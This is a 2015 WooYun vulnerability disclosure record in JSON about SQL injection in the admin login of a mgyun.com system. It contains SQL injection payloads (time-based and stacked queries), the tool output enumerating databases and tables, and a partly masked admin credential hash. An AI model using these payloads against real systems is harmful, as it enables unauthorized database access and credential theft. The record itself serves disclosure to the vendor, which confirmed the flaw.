{"id": 31693, "wybug_id": "wooyun-2015-0113388", "wybug_title": "信壹网络(刷机大师)某系统登录处SQL注射大量数据库", "wybug_corp": "mgyun.com", "wybug_author": "路人甲", "wybug_date": "2015-05-11 11:51", "wybug_open_date": "2015-06-25 14:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： 233 详细说明：  \nhttp://fx.mgyun.com/main/admin/login.aspx(POST)Button1=&TextBox1=rrNqPVs&TextBox2=1&__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=/wEdAASHJB/7/ES5qw7oTlLMoJSqESCFkFW/RuhzY1oLb/NUVB2nXP6dhZn6mKtmTGNHd3PN%2bDvxnwFeFeJ9MIBWR693zA7sPhuVp7oyUWjddbTxrKvSqmddzonSdJITSPdfViA%3d&__LASTFOCUS=&__VIEWSTATE=/wEPDwUJOTk2MDA3NzM2ZGSUmCpyWWbsdK/7soAnkm/NxYDeJrd4mcNVYdeEDZxzSA%3d%3d参数textbox1参考payload:rrNqPVs';WAITFOR DELAY '0:0:5'--\n   漏洞证明：  \n---Parameter: TextBox1 (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Button1=&TextBox1=rrNqPVs';WAITFOR DELAY '0:0:5'--&TextBox2=1&__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=/wEdAASHJB/7/ES5qw7oTlLMoJSqESCFkFW/RuhzY1oLb/NUVB2nXP6dhZn6mKtmTGNHd3PN+DvxnwFeFeJ9MIBWR693zA7sPhuVp7oyUWjddbTxrKvSqmddzonSdJITSPdfViA=&__LASTFOCUS=&__VIEWSTATE=/wEPDwUJOTk2MDA3NzM2ZGSUmCpyWWbsdK/7soAnkm/NxYDeJrd4mcNVYdeEDZxzSA==    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: Button1=&TextBox1=rrNqPVs' OR 9245=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'fgsi'='fgsi&TextBox2=1&__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=/wEdAASHJB/7/ES5qw7oTlLMoJSqESCFkFW/RuhzY1oLb/NUVB2nXP6dhZn6mKtmTGNHd3PN+DvxnwFeFeJ9MIBWR693zA7sPhuVp7oyUWjddbTxrKvSqmddzonSdJITSPdfViA=&__LASTFOCUS=&__VIEWSTATE=/wEPDwUJOTk2MDA3NzM2ZGSUmCpyWWbsdK/7soAnkm/NxYDeJrd4mcNVYdeEDZxzSA==---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008available databases [67]:[*] AnalyzeSystem[*] ApkGrabDB[*] AppCoolPoints.............Database: AnalyzeSystem[7 tables]+------------+| Admin      || Functions  || Group      || Manager    || MenuConfig || Model      || ModelGroup |+------------+从这里拿到管理密码。Table: Admin[1 entry]+---------+---------+--------------------+----------+----------------------------------+| AdminID | GroupID | DateLine           | AdminPwd | AdminName                        |+---------+---------+--------------------+----------+----------------------------------+| 1       | 0       | 09 25 2012  3:43PM | 薍Ꝿꅻٴ塔    | 3f85cffcdcf****a8a3b66cd47f7afed |+---------+---------+--------------------+----------+----------------------------------+可惜还没爆破出来，要不还真想进后台看看！估计里面信息量够大吧！\n   修复方案：  ~~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-05-11 14:21 厂商回复： 谢谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-11 12:02 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  没走首页！,rank又要除5了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}